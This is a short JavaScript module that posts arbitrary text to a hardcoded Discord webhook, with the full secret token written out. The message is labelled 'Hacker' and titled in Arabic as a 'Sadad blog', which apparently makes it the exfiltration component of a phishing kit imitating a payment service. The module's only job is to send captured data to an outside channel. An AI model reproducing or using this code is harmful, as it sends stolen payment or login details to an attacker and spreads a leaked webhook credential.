import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322959892910309386/shlgA30j2z6bpgGlo0taj0lg5GuETNSDhLFiJo9mrzJijgDgNV6Dic1b9akZsGbeELQB",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
